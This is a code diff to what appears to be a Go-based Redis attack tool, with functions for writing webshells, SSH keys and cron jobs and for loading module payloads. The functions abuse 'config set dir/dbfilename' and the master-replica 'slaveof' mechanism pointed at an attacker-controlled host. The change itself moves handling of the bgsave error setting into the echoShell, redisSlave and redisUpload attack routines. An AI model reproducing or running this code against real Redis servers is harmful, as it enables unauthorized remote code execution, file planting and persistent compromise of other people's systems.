@@ -32,7 +32,6 @@ var (
 	command, rpath, rfile, lfile, webshell, user       string
 	execTemplate, execName                             string
 	b64                                                bool
-	bgErr                                              string
 )
 
 func init() {
@@ -118,12 +117,6 @@ func main() {
 		if err := connection(rhost, rport, pwd); err != nil {
 			fmt.Println(err)
 			return
-		}
-
-		bgErr = configGet("stop-writes-on-bgsave-error")
-
-		if bgErr != "no" {
-			cliInfo("config set stop-writes-on-bgsave-error no")
 		}
 
 		redisDir = configGet("dir")
@@ -241,9 +234,6 @@ func main() {
 
 	}
 
-	defer func() {
-		cliInfo("config set stop-writes-on-bgsave-error " + bgErr)
-	}()
 }
 
 // 连接redis
@@ -407,6 +397,11 @@ func parseArgs(cmd string) ([]interface{}, error) {
 // 写 webshell  , ssh , cron
 func echoShell(dir, dbfilename, webshell string) {
 
+	bgErr := configGet("stop-writes-on-bgsave-error")
+	if bgErr != "no" {
+		cliInfo("config set stop-writes-on-bgsave-error no")
+	}
+
 	cliInfo("config set dir " + dir)
 	cliInfo("config set dbfilename " + dbfilename)
 
@@ -462,7 +457,7 @@ func echoShell(dir, dbfilename, webshell string) {
 
 		cliInfo("config set rdbcompression " + compression)
 		cliInfo("config set slave-read-only " + readOnly)
-
+		cliInfo("config set stop-writes-on-bgsave-error " + bgErr)
 	}()
 }
 
@@ -473,6 +468,11 @@ func redisSlave(lhost, lport, dir, dbfilename string) {
 		payload = exp.SoPayload
 	} else {
 		payload = exp.DllPayload
+	}
+
+	bgErr := configGet("stop-writes-on-bgsave-error")
+	if bgErr != "no" {
+		cliInfo("config set stop-writes-on-bgsave-error no")
 	}
 
 	cliInfo("bgsave")
@@ -639,6 +639,11 @@ func redisUpload(lhost, lport, rpath, rfile, lfile string) {
 		os.Exit(0)
 	}
 
+	bgErr := configGet("stop-writes-on-bgsave-error")
+	if bgErr != "no" {
+		cliInfo("config set stop-writes-on-bgsave-error no")
+	}
+
 	cliInfo(fmt.Sprintf("slaveof %v %v", lhost, lport))
 	cliInfo("config set dir " + rpath)
 	cliInfo("config set dbfilename " + rfile)
@@ -652,7 +657,7 @@ func redisUpload(lhost, lport, rpath, rfile, lfile string) {
 		closeSlave("upload")
 		cliInfo("config set dir " + redisDir)
 		cliInfo("config set dbfilename " + redisDBFilename)
-
+		cliInfo("config set stop-writes-on-bgsave-error " + bgErr)
 	}()
 }
 
